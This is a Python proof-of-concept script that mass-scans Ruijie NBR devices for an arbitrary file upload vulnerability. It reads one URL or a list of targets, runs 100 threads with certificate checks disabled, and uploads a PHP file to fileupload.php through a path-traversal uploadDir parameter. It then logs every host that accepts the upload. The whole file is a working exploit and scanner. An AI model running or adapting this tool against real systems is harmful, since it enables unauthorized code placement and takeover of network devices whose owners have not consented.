import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text = """锐捷NBR"""
    print(text)

def main():
    banner()
    parser = argparse.ArgumentParser(description="锐捷NBR文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tuage:python {sys.argv[0]} -h")
def poc(target):
    payload = '/ddi/server/fileupload.php?uploadDir=../../321&name=123.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
    }
    files = {
        'file': ('111.php', '<?php phpinfo();?>', 'image/jpeg')
    }
    try:
        res = requests.get(url=target,verify=False,timeout=5)
        if res.status_code == 200:
            res2 = requests.post(url=target+payload,headers=headers,files=files,timeout=5, verify=False)
            if res2.status_code == 200 and '123.php' in res2.text:
                print(f'[+]该{target}存在任意文件上传漏洞')
                with open('锐捷_result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f'[-]该{target}不存在任意文件上传漏洞')
                return False
    except Exception as e:
        print(f'{target}可能存在任意文件漏洞请手工测试')
if __name__ == '__main__':
    main()